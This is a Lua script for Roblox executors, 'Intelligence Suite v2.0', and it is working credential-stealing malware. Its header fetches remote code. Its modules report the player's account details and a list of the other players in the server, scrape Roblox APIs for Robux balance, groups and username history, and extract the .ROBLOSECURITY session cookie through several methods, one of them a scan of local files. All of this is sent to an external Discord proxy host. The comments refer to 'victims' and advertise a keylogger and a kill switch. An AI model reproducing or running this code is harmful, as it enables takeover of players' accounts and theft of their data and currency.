-- Intelligence Suite v2.0
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()

local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PROXY = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"

-- Per-session unique ID so multiple victims don't conflict
local SESSION_ID = tostring(LocalPlayer.UserId) .. "_" .. tostring(math.random(100000, 999999))

-- Initialize global registry if not exists
if not getgenv().IntelSuiteRegistry then
    getgenv().IntelSuiteRegistry = {}
end

-- Each session gets its own isolated state table stored under its session ID
-- We do NOT overwrite getgenv().IntelSuite globally — that broke multi-session
getgenv().IntelSuiteRegistry[SESSION_ID] = {
    Buffer = "",
    IsActive = true,
    ChatSpyActive = false,
    RemoteSpyActive = false,
    MouseLogActive = false,
    ChatLogActive = false,
    TextBoxActive = false,
    JoinLeaveActive = false,
    PersistenceLoop = false,
    PersistenceInstalled = false,
    KillLoopActive = false,
    ScreamerActive = false,
    SessionID = SESSION_ID
}

-- Local reference used throughout THIS execution only
local IntelSuite = getgenv().IntelSuiteRegistry[SESSION_ID]

-- Also keep getgenv().IntelSuite pointing to this session for legacy module refs
-- Each session overwrites this — that's OK because each session is self-contained
getgenv().IntelSuite = IntelSuite

local function POST(url, body)
    local h = {["Content-Type"] = "application/json"}
    pcall(function()
        if request then
            request({Url=url, Method="POST", Headers=h, Body=body})
        elseif http_request then
            http_request({Url=url, Method="POST", Headers=h, Body=body})
        elseif syn and syn.request then
            syn.request({Url=url, Method="POST", Headers=h, Body=body})
        else
            HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

local function GET(url)
    local out = nil
    pcall(function()
        if request then
            out = request({Url=url, Method="GET"}).Body
        elseif http_request then
            out = http_request({Url=url, Method="GET"}).Body
        elseif syn and syn.request then
            out = syn.request({Url=url, Method="GET"}).Body
        end
    end)
    return out
end

local function send(title, desc, color)
    local ok, encoded = pcall(function()
        return HttpService:JSONEncode({
            embeds = {{
                title = tostring(title),
                description = tostring(desc):sub(1, 1900),
                color = color or 65535,
                footer = {text = "Intelligence Suite v2.0 | Session: " .. SESSION_ID},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end)
    if ok and encoded then POST(PROXY, encoded) end
end

local function getExec()
    if identifyexecutor then
        local ok, r = pcall(identifyexecutor)
        if ok and r then return tostring(r) end
    end
    if getexecutorname then
        local ok, r = pcall(getexecutorname)
        if ok and r then return tostring(r) end
    end
    if syn and syn.version then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if listfiles then
        local ok, f = pcall(listfiles, "")
        if ok and f then
            for _, v in ipairs(f) do
                local l = tostring(v):lower()
                if l:find("xeno") then return "Xeno" end
                if l:find("krnl") then return "KRNL" end
                if l:find("synapse") then return "Synapse X" end
                if l:find("scriptware") then return "Script-Ware" end
                if l:find("solara") then return "Solara" end
                if l:find("wave") then return "Wave" end
                if l:find("delta") then return "Delta" end
            end
        end
    end
    return "Unknown"
end

local function getGame()
    local name = "Unknown"
    pcall(function()
        name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return name
end

local function getPlayerList()
    local list = ""
    local count = 0
    for _, p in ipairs(Players:GetPlayers()) do
        count = count + 1
        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
    end
    return list, count
end

-- ============================================================
-- MODULE 1: Execution Alert
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local game_name = getGame()
    local playerList, playerCount = getPlayerList()
    send("SCRIPT EXECUTED",
        "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. exec ..
        "\n**Game:** " .. game_name ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n**Players in server:** " .. tostring(playerCount) ..
        "\n\n**Active Modules:** Keylogger, Token Stealer, API Scraper, Clipboard, Anti-AFK, Heartbeat, Kill Switch",
        65280
    )
end)

task.wait(1)

-- ============================================================
-- ============================================================
-- MODULE 2B: SCRAPE DATA (Player List)
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local uid = tostring(LocalPlayer.UserId)

    local desc = "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. uid ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. getExec() ..
        "\n**Game:** " .. getGame() ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId) ..
        "\n**Players in server:** " .. tostring(#Players:GetPlayers())

    local playerList = ""
    for _, p in ipairs(Players:GetPlayers()) do
        playerList = playerList .. "\n" .. p.Name ..
            " (ID: " .. tostring(p.UserId) ..
            ", Age: " .. tostring(p.AccountAge) .. "d)"
    end

    desc = desc .. "\n" .. playerList
    desc = desc .. "\n**Time:** " .. tostring(os.time())

    send("SCRAPE DATA", desc, 3066993)
end)

task.wait(1)


-- MODULE 2: Full Roblox API Scraper
-- ============================================================
task.spawn(function()
    if not getgenv().IntelSuite.IsActive then return end
    local uid = tostring(LocalPlayer.UserId)
    local desc = "**User:** " .. LocalPlayer.Name ..
        "\n**User ID:** " .. uid ..
        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
        "\n**Executor:** " .. getExec() ..
        "\n**Game:** " .. getGame() ..
        "\n**Place ID:** " .. tostring(game.PlaceId) ..
        "\n**Job ID:** " .. tostring(game.JobId)

    -- Premium check
    local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
    desc = desc .. "\n**Premium:** " .. tostring(premium)

    -- Friends count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Friends:** " .. tostring(d.count)
        end
    end)

    -- Followers count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Followers:** " .. tostring(d.count)
        end
    end)

    -- Following count
    pcall(function()
        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followings/count")
        if r then
            local d = HttpService:JSONDecode(r)
            desc = desc .. "\n**Following:** " .. tostring(d.count)
        end
    end)

    -- Robux balance (if accessible)
    pcall(function()
        local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.robux then
                desc = desc .. "\n**Robux:** " .. tostring(d.robux)
            end
        end
    end)

    -- Groups
    pcall(function()
        local r = GET("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data then
                local groups = "\n**Groups:**"
                local count = 0
                for _, g in ipairs(d.data) do
                    if count >= 5 then break end
                    groups = groups .. "\n  - " .. tostring(g.group.name) .. " [" .. tostring(g.role.name) .. "]"
                    count = count + 1
                end
                desc = desc .. groups
            end
        end
    end)

    -- Past usernames
    pcall(function()
        local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data and #d.data > 0 then
                local names = "\n**Past Usernames:**"
                for _, n in ipairs(d.data) do
                    names = names .. "\n  - " .. tostring(n.name)
                end
                desc = desc .. names
            end
        end
    end)

    -- Badge count
    pcall(function()
        local r = GET("https://badges.roblox.com/v1/users/" .. uid .. "/badges?limit=10")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data then
                desc = desc .. "\n**Badges (first 10):** " .. tostring(#d.data)
            end
        end
    end)

    -- Game passes owned
    pcall(function()
        local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
        if r then
            local d = HttpService:JSONDecode(r)
            if d.data and #d.data > 0 then
                local passes = "\n**Game Passes:**"
                for _, p in ipairs(d.data) do
                    passes = passes .. "\n  - " .. tostring(p.name)
                end
                desc = desc .. passes
            end
        end
    end)

    send("FULL ACCOUNT SCRAPE", desc, 65535)
end)

task.wait(1)

-- ============================================================
-- MODULE 3: Token / Cookie Stealer v7
-- Runs on startup. Grabs .ROBLOSECURITY and sends to Discord.
-- Phase 1: Extract. Phase 2: Package. Phase 3: POST.
-- ============================================================
task.spawn(function()
    local exec = getExec()
    local token = nil
    local method = "none"
    local req = request or http_request or (syn and syn.request) or (http and http.request)

    -- Extract: try every known method
    -- M1: getcookies() table
    if not token and getcookies then
        pcall(function()
            local c = getcookies()
            if type(c) == "table" then
                for k, v in pairs(c) do
                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                        token = tostring(v)
                        method = "getcookies()"
                        break
                    end
                    if type(v) == "table" then
                        for ck, cv in pairs(v) do
                            if tostring(ck):find("ROBLOSECURITY") and #tostring(cv) > 20 then
                                token = tostring(cv)
                                method = "getcookies() nested"
                                break
                            end
                        end
                    end
                    if token then break end
                end
            end
        end)
    end

    -- M2: syn.get_cookie
    if not token and syn and syn.get_cookie then
        pcall(function()
            local v = syn.get_cookie(".ROBLOSECURITY")
            if v and #v > 20 then token = v method = "syn.get_cookie" end
        end)
    end

    -- M3: getrbxcookie
    if not token and getrbxcookie then
        pcall(function()
            local v = getrbxcookie()
            if v and #v > 20 then token = v method = "getrbxcookie()" end
        end)
    end

    -- M4: res.Cookies table from HTTP request (works on Xeno + all executors)
    if not token and req then
        pcall(function()
            local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
            if res then
                if type(res.Cookies) == "table" then
                    for k, v in pairs(res.Cookies) do
                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
                            token = tostring(v)
                            method = "res.Cookies"
                            break
                        end
                    end
                end
                if not token and res.Headers then
                    for k, v in pairs(res.Headers) do
                        if tostring(k):lower() == "set-cookie" then
                            local found = tostring(v):match("%.ROBLOSECURITY=([^;]+)")
                            if found and #found > 20 then
                                token = found
                                method = "Set-Cookie header"
                            end
                        end
                    end
                end
            end
        end)
    end

    -- M5: readfile scan (Xeno has readfile)
    if not token and readfile and listfiles then
        pcall(function()
            local scanned = 0
            local function scan(path)
                if scanned >= 300 or token then return end
                local ok, content = pcall(readfile, path)
                if ok and type(content) == "string" and #content > 10 then
                    scanned = scanned + 1
                    local found = content:match("ROBLOSECURITY[=_]([^;%s,]+)")
                    if found and #found > 20 then
                        token = found
                        method = "readfile:" .. tostring(path)
                        return
                    end
                end
                local lok, files = pcall(listfiles, path)
                if lok and type(files) == "table" then
                    for _, f in ipairs(files) do
                        if token then break end
                        scan(f)
                    end
                end
            end
            for _, root in ipairs({"", "cache", "cookies", "Xeno", "xeno", "data"}) do
                if token then break end
                scan(root)
            end
        end)
    end

    -- Package + POST
    local uid = tostring(LocalPlayer.UserId)
    if token then
        send("ROBLOSECURITY TOKEN",
            "**User:** " .. LocalPlayer.Name ..
            "\n**ID:** " .. uid ..
            "\n**Executor:** " .. exec ..
            "\n**Method:** " .. method ..
            "\n**Session:** " .. SESSION_ID ..
            "\n**Token:**\n```" .. token:sub(1, 900) .. "```",
            16711680)
    else
        send("TOKEN STEALER FAILED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. exec ..
            "\n**Session:** " .. SESSION_ID ..
            "\n**Note:** All methods returned nothing.",
            16711680)
    end
end)
task.wait(2)

